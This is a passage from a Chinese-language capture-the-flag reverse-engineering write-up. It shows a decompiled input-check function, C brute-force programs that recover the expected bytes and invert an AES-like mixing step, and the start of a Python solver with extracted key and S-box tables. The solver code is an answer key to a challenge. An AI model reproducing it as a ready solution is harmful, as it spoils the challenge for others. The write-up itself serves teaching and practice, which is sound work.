class="hljs-number">1</span>;    &#125;    v15 = a1[<span class="hljs-number">1</span>];    *(&amp;v15 + <span class="hljs-number">1</span>) = a1[<span class="hljs-number">0</span>];    v14 = a1[<span class="hljs-number">2</span>];    v13 = a1[<span class="hljs-number">3</span>];    v12 = a1[<span class="hljs-number">4</span>];    v11 = a1[<span class="hljs-number">5</span>];    v10 = a1[<span class="hljs-number">6</span>];    v9 = a1[<span class="hljs-number">7</span>];    v8 = a1[<span class="hljs-number">8</span>];    v7 = a1[<span class="hljs-number">9</span>];    v6 = a1[<span class="hljs-number">10</span>];    v5 = a1[<span class="hljs-number">11</span>];    v1 = (<span class="hljs-type">unsigned</span> __int8)v7 &amp; (<span class="hljs-type">unsigned</span> __int8)v8 &amp; (<span class="hljs-type">unsigned</span> __int8)v9 &amp; (v11 == <span class="hljs-number">0</span>) &amp; (v12 == <span class="hljs-number">0</span>) &amp; (<span class="hljs-type">unsigned</span> __int8)v13 &amp; ((v14 | v15 | *(&amp;v15 + <span class="hljs-number">1</span>)) == <span class="hljs-number">0</span>) &amp; (v10 == <span class="hljs-number">0</span>) &amp; (v6 == <span class="hljs-number">0</span>) | (<span class="hljs-type">unsigned</span> __int8)v7 &amp; (<span class="hljs-type">unsigned</span> __int8)v9 &amp; (<span class="hljs-type">unsigned</span> __int8)v11 &amp; (v13 == <span class="hljs-number">0</span>) &amp; (v14 == <span class="hljs-number">0</span>) &amp; *(<span class="hljs-type">char</span> *)(&amp;v15 + <span class="hljs-number">1</span>) &amp; (v15 == <span class="hljs-number">0</span>) &amp; (v12 == <span class="hljs-number">0</span>) &amp; (v10 == <span class="hljs-number">0</span>) &amp; (v8 == <span class="hljs-number">0</span>) &amp; (v6 == <span class="hljs-number">0</span>) | (<span class="hljs-type">unsigned</span> __int8)v6 &amp; (v8 == <span class="hljs-number">0</span>) &amp; (v9 == <span class="hljs-number">0</span>) &amp; (v10 == <span class="hljs-number">0</span>) &amp; (<span class="hljs-type">unsigned</span> __int8)v11 &amp; (<span class="hljs-type">unsigned</span> __int8)v12 &amp; (<span class="hljs-type">unsigned</span> __int8)(v14 &amp; v15 &amp; *(<span class="hljs-type">char</span> *)(&amp;v15 + <span class="hljs-number">1</span>)) &amp; (v13 == <span class="hljs-number">0</span>) &amp; (v7 == <span class="hljs-number">0</span>);    v2 = (<span class="hljs-type">unsigned</span> __int8)v5 &amp; (<span class="hljs-type">unsigned</span> __int8)v6 &amp; (<span class="hljs-type">unsigned</span> __int8)v8 &amp; (<span class="hljs-type">unsigned</span> __int8)v9 &amp; (<span class="hljs-type">unsigned</span> __int8)v10 &amp; (<span class="hljs-type">unsigned</span> __int8)v11 &amp; (<span class="hljs-type">unsigned</span> __int8)v12 &amp; (v14 == <span class="hljs-number">0</span>) &amp; (<span class="hljs-type">unsigned</span> __int8)(v15 &amp; *(<span class="hljs-type">char</span> *)(&amp;v15 + <span class="hljs-number">1</span>)) &amp; (v13 == <span class="hljs-number">0</span>) &amp; (v7 == <span class="hljs-number">0</span>) | (v6 == <span class="hljs-number">0</span>) &amp; (v7 == <span class="hljs-number">0</span>) &amp; (<span class="hljs-type">unsigned</span> __int8)v8 &amp; (<span class="hljs-type">unsigned</span> __int8)v9 &amp; (<span class="hljs-type">unsigned</span> __int8)v10 &amp; (<span class="hljs-type">unsigned</span> __int8)v12 &amp; (<span class="hljs-type">unsigned</span> __int8)v13 &amp; (<span class="hljs-type">unsigned</span> __int8)v15 &amp; (*(&amp;v15 + <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>) &amp; (v14 == <span class="hljs-number">0</span>) &amp; (v11 == <span class="hljs-number">0</span>) &amp; (v5 == <span class="hljs-number">0</span>) | (<span class="hljs-type">unsigned</span> __int8)v5 &amp; (v7 == <span class="hljs-number">0</span>) &amp; (<span class="hljs-type">unsigned</span> __int8)v8 &amp; (<span class="hljs-type">unsigned</span> __int8)v10 &amp; (<span class="hljs-type">unsigned</span> __int8)v12 &amp; (<span class="hljs-type">unsigned</span> __int8)v13 &amp; (<span class="hljs-type">unsigned</span> __int8)v14 &amp; *(<span class="hljs-type">char</span> *)(&amp;v15 + <span class="hljs-number">1</span>) &amp; (v15 == <span class="hljs-number">0</span>) &amp; (v11 == <span class="hljs-number">0</span>) &amp; (v9 == <span class="hljs-number">0</span>) &amp; (v6 == <span class="hljs-number">0</span>) | (<span class="hljs-type">unsigned</span> __int8)v5 &amp; (<span class="hljs-type">unsigned</span> __int8)v7 &amp; (<span class="hljs-type">unsigned</span> __int8)v8 &amp; (<span class="hljs-type">unsigned</span> __int8)v10 &amp; (<span class="hljs-type">unsigned</span> __int8)v11 &amp; (<span class="hljs-type">unsigned</span> __int8)v13 &amp; (<span class="hljs-type">unsigned</span> __int8)v14 &amp; (*(_QWORD *)&amp;v15 == <span class="hljs-number">0</span>) &amp; (v12 == <span class="hljs-number">0</span>) &amp; (v9 == <span class="hljs-number">0</span>) &amp; (v6 == <span class="hljs-number">0</span>) | (v1 | (<span class="hljs-type">unsigned</span> __int8)v6 &amp; (<span class="hljs-type">unsigned</span> __int8)v7 &amp; (v9 == <span class="hljs-number">0</span>) &amp; (<span class="hljs-type">unsigned</span> __int8)v10 &amp; (v12 == <span class="hljs-number">0</span>) &amp; (<span class="hljs-type">unsigned</span> __int8)v13 &amp; (<span class="hljs-type">unsigned</span> __int8)v14 &amp; *(<span class="hljs-type">char</span> *)(&amp;v15 + <span class="hljs-number">1</span>) &amp; (v15 == <span class="hljs-number">0</span>) &amp; (v11 == <span class="hljs-number">0</span>) &amp; (v8 == <span class="hljs-number">0</span>)) &amp; (v5 == <span class="hljs-number">0</span>);    v3 = (<span class="hljs-type">unsigned</span> __int8)v5 &amp; (<span class="hljs-type">unsigned</span> __int8)v6 &amp; (v8 == <span class="hljs-number">0</span>) &amp; (v9 == <span class="hljs-number">0</span>) &amp; (<span class="hljs-type">unsigned</span> __int8)v10 &amp; (v12 == <span class="hljs-number">0</span>) &amp; (v13 == <span class="hljs-number">0</span>) &amp; (v14 == <span class="hljs-number">0</span>) &amp; (<span class="hljs-type">unsigned</span> __int8)(v15 &amp; *(<span class="hljs-type">char</span> *)(&amp;v15 + <span class="hljs-number">1</span>)) &amp; (v11 == <span class="hljs-number">0</span>) &amp; (v7 == <span class="hljs-number">0</span>) | (v6 == <span class="hljs-number">0</span>) &amp; (v7 == <span class="hljs-number">0</span>) &amp; (v8 == <span class="hljs-number">0</span>) &amp; (v9 == <span class="hljs-number">0</span>) &amp; (<span class="hljs-type">unsigned</span> __int8)v10 &amp; (v12 == <span class="hljs-number">0</span>) &amp; (<span class="hljs-type">unsigned</span> __int8)v13 &amp; ((v14 | v15 | *(&amp;v15 + <span class="hljs-number">1</span>)) == <span class="hljs-number">0</span>) &amp; (v11 == <span class="hljs-number">0</span>) &amp; (v5 == <span class="hljs-number">0</span>) | (<span class="hljs-type">unsigned</span> __int8)v5 &amp; (<span class="hljs-type">unsigned</span> __int8)v6 &amp; (<span class="hljs-type">unsigned</span> __int8)v7 &amp; (v9 == <span class="hljs-number">0</span>) &amp; (v10 == <span class="hljs-number">0</span>) &amp; (<span class="hljs-type">unsigned</span> __int8)v11 &amp; (<span class="hljs-type">unsigned</span> __int8)v12 &amp; (v14 == <span class="hljs-number">0</span>) &amp; (<span class="hljs-type">unsigned</span> __int8)v15 &amp; (*(&amp;v15 + <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>) &amp; (v13 == <span class="hljs-number">0</span>) &amp; (v8 == <span class="hljs-number">0</span>) | (<span class="hljs-type">unsigned</span> __int8)v5 &amp; (<span class="hljs-type">unsigned</span> __int8)v7 &amp; (v9 == <span class="hljs-number">0</span>) &amp; (v10 == <span class="hljs-number">0</span>) &amp; (<span class="hljs-type">unsigned</span> __int8)v11 &amp; ((v12 | v13 | v14 | v15 | *(&amp;v15 + <span class="hljs-number">1</span>)) == <span class="hljs-number">0</span>) &amp; (v8 == <span class="hljs-number">0</span>) &amp; (v6 == <span class="hljs-number">0</span>) | (<span class="hljs-type">unsigned</span> __int8)v5 &amp; (v7 == <span class="hljs-number">0</span>) &amp; (v8 == <span class="hljs-number">0</span>) &amp; (<span class="hljs-type">unsigned</span> __int8)v9 &amp; (<span class="hljs-type">unsigned</span> __int8)v10 &amp; (<span class="hljs-type">unsigned</span> __int8)v11 &amp; (<span class="hljs-type">unsigned</span> __int8)v12 &amp; (v14 == <span class="hljs-number">0</span>) &amp; *(<span class="hljs-type">char</span> *)(&amp;v15 + <span class="hljs-number">1</span>) &amp; (v15 == <span class="hljs-number">0</span>) &amp; (v13 == <span class="hljs-number">0</span>) &amp; (v6 == <span class="hljs-number">0</span>) | v2;    <span class="hljs-keyword">if</span> ( !((<span class="hljs-type">unsigned</span> __int8)v6 &amp; (<span class="hljs-type">unsigned</span> __int8)v8 &amp; (<span class="hljs-type">unsigned</span> __int8)v10 &amp; (<span class="hljs-type">unsigned</span> __int8)v12 &amp; (v14 == <span class="hljs-number">0</span>) &amp; (<span class="hljs-type">unsigned</span> __int8)v15 &amp; (*(&amp;v15 + <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>) &amp; (v13 == <span class="hljs-number">0</span>) &amp; (v11 == <span class="hljs-number">0</span>) &amp; (v9 == <span class="hljs-number">0</span>) &amp; (v7 == <span class="hljs-number">0</span>) &amp; (v5 == <span class="hljs-number">0</span>) | (<span class="hljs-type">unsigned</span> __int8)v5 &amp; (<span class="hljs-type">unsigned</span> __int8)v6 &amp; (<span class="hljs-type">unsigned</span> __int8)v7 &amp; (<span class="hljs-type">unsigned</span> __int8)v8 &amp; (v10 == <span class="hljs-number">0</span>) &amp; (v11 == <span class="hljs-number">0</span>) &amp; (<span class="hljs-type">unsigned</span> __int8)v12 &amp; (v14 == <span class="hljs-number">0</span>) &amp; (<span class="hljs-type">unsigned</span> __int8)v15 &amp; (*(&amp;v15 + <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>) &amp; (v13 == <span class="hljs-number">0</span>) &amp; (v9 == <span class="hljs-number">0</span>) | v3 | (<span class="hljs-type">unsigned</span> __int8)v6 &amp; (<span class="hljs-type">unsigned</span> __int8)v7 &amp; (<span class="hljs-type">unsigned</span> __int8)v8 &amp; (<span class="hljs-type">unsigned</span> __int8)v10 &amp; (<span class="hljs-type">unsigned</span> __int8)v12 &amp; ((v13 | v14 | v15 | *(&amp;v15 + <span class="hljs-number">1</span>)) == <span class="hljs-number">0</span>) &amp; (v11 == <span class="hljs-number">0</span>) &amp; (v9 == <span class="hljs-number">0</span>) &amp; (v5 == <span class="hljs-number">0</span>)) )      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;&#125;<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">16</span>; j++) &#123;        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) &#123;        <span class="hljs-keyword">if</span> (check(j, i)) &#123;            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d\n&quot;</span>, j, i);        &#125;    &#125;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>利用脚本爆破出最后的结果[18, 143, 236, 194, 133, 4, 178, 76, 91, 186, 74, 207, 17, 54, 10, 72]</p><p>然后针对中间一个乱七八糟的异或写出爆破脚本获取传入数据</p><div class="code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><span class="hljs-type">uint8_t</span> <span class="hljs-title function_">magic</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> a1)</span> &#123;    <span class="hljs-keyword">if</span> (a1 &amp; <span class="hljs-number">0x80</span>) &#123;        <span class="hljs-keyword">return</span> ((<span class="hljs-number">2</span> * a1) ^ <span class="hljs-number">0x1B</span>) &amp; <span class="hljs-number">0xFF</span>;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">return</span> (<span class="hljs-number">2</span> * a1) &amp; <span class="hljs-number">0xFF</span>;    &#125;&#125;<span class="hljs-type">void</span> <span class="hljs-title function_">magic_xor</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> a1[<span class="hljs-number">4</span>])</span> &#123;        <span class="hljs-type">uint8_t</span> v1 = a1[<span class="hljs-number">2</span>] ^ magic(a1[<span class="hljs-number">1</span>]) ^ a1[<span class="hljs-number">1</span>] ^ magic(a1[<span class="hljs-number">0</span>]) ^ a1[<span class="hljs-number">3</span>];        <span class="hljs-type">uint8_t</span> v2 = magic(a1[<span class="hljs-number">2</span>]) ^ a1[<span class="hljs-number">2</span>] ^ magic(a1[<span class="hljs-number">1</span>]) ^ a1[<span class="hljs-number">0</span>] ^ a1[<span class="hljs-number">3</span>];        <span class="hljs-type">uint8_t</span> v3 = magic(a1[<span class="hljs-number">2</span>]) ^ a1[<span class="hljs-number">1</span>] ^ a1[<span class="hljs-number">0</span>] ^ magic(a1[<span class="hljs-number">3</span>]) ^ a1[<span class="hljs-number">3</span>];        <span class="hljs-type">uint8_t</span> v4 = a1[<span class="hljs-number">2</span>] ^ a1[<span class="hljs-number">1</span>] ^ a1[<span class="hljs-number">0</span>] ^ magic(a1[<span class="hljs-number">0</span>]) ^ magic(a1[<span class="hljs-number">3</span>]);        a1[<span class="hljs-number">0</span>] = v1;        a1[<span class="hljs-number">1</span>] = v2;        a1[<span class="hljs-number">2</span>] = v3;        a1[<span class="hljs-number">3</span>] = v4;&#125;<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span> &#123;    <span class="hljs-type">uint8_t</span> result[<span class="hljs-number">16</span>];    <span class="hljs-type">uint8_t</span> origin[<span class="hljs-number">16</span>] = &#123;<span class="hljs-number">0</span>&#125;;    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++) &#123;        result[i] = (<span class="hljs-type">uint8_t</span>)strtol(argv[i + <span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">16</span>);    &#125;    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;        <span class="hljs-type">uint8_t</span> a1[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> c1 = <span class="hljs-number">0</span>; c1 &lt; <span class="hljs-number">256</span>; c1++) &#123;            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> c2 = <span class="hljs-number">0</span>; c2 &lt; <span class="hljs-number">256</span>; c2++) &#123;                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> c3 = <span class="hljs-number">0</span>; c3 &lt; <span class="hljs-number">256</span>; c3++) &#123;                        <span class="hljs-type">int</span> c4 = result[i]^result[i+<span class="hljs-number">4</span>]^result[i+<span class="hljs-number">8</span>]^result[i+<span class="hljs-number">12</span>]^c1^c2^c3;                        a1[<span class="hljs-number">0</span>] = c1;                        a1[<span class="hljs-number">1</span>] = c2;                        a1[<span class="hljs-number">2</span>] = c3;                        a1[<span class="hljs-number">3</span>] = c4;                        magic_xor(a1);                        <span class="hljs-keyword">if</span> (a1[<span class="hljs-number">0</span>] == result[i] &amp;&amp; a1[<span class="hljs-number">1</span>] == result[i+<span class="hljs-number">4</span>] &amp;&amp; a1[<span class="hljs-number">2</span>] == result[i+<span class="hljs-number">8</span>] &amp;&amp; a1[<span class="hljs-number">3</span>] == result[i+<span class="hljs-number">12</span>]) &#123;                            <span class="hljs-comment">// printf(&quot;%02x, %02x, %02x, %02x\n&quot;, c1, c2, c3, c4);</span>                            origin[i] = c1;                            origin[i+<span class="hljs-number">4</span>] = c2;                            origin[i+<span class="hljs-number">8</span>] = c3;                            origin[i+<span class="hljs-number">12</span>] = c4;                        &#125;                &#125;            &#125;        &#125;    &#125;    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++) &#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%02x, &quot;</span>, origin[i]);    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>编译后供Python脚本使用</p><p>中间可以动调提取出异或的数据以及置换的table</p><div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> subprocessburp = [<span class="hljs-number">18</span>, <span class="hljs-number">143</span>, <span class="hljs-number">236</span>, <span class="hljs-number">194</span>, <span class="hljs-number">133</span>, <span class="hljs-number">4</span>, <span class="hljs-number">178</span>, <span class="hljs-number">76</span>, <span class="hljs-number">91</span>, <span class="hljs-number">186</span>, <span class="hljs-number">74</span>, <span class="hljs-number">207</span>, <span class="hljs-number">17</span>, <span class="hljs-number">54</span>, <span class="hljs-number">10</span>, <span class="hljs-number">72</span>]v4 = [<span class="hljs-number">0x9A</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xA9</span>]xor_key = [<span class="hljs-number">0x35</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x79</span>]table = [<span class="hljs-number">0x63</span>, <span class="hljs-number">0x7c</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0xf2</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0xc5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0xfe</span>, <span class="hljs-number">0xd7</span>, <span class="hljs-number">0xab</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xca</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0xfa</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0xd4</span>, <span class="hljs-number">0xa2</span>, <span class="hljs-number">0xaf</span>, <span class="hljs-number">0x9c</span>, <span class="hljs-number">0xa4</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0xb7</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x4</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xc3</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x5</span>, <span class="hljs-number">0x9a</span>, <span class="hljs-number">0x7</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x1a</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0xa0</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0xd6</span>, <span class="hljs-number">0xb3</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0xd1</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xfc</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0xcb</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xcf</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0xef</span>, <span class="hljs-number">0xaa</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0xa8</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x8f</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xf5</span>, <span class="hljs-number">0xbc</span>, <span class="hljs-number">0xb6</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0xd2</span>, <span class="hljs-number">0xcd</span>, <span class="hljs-number">0xc</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0xec</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xc4</span>, <span class="hljs-number">0xa7</span>, <span class="hljs-number">0x7e</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x4f</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xee</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xde</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0xdb</span>, <span class="hljs-number">0xe0</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x3a</span>, <span class="hljs-number">0xa</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x6</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5c</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0xd3</span>, <span class="hljs-number">0xac</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x91</span>, <span 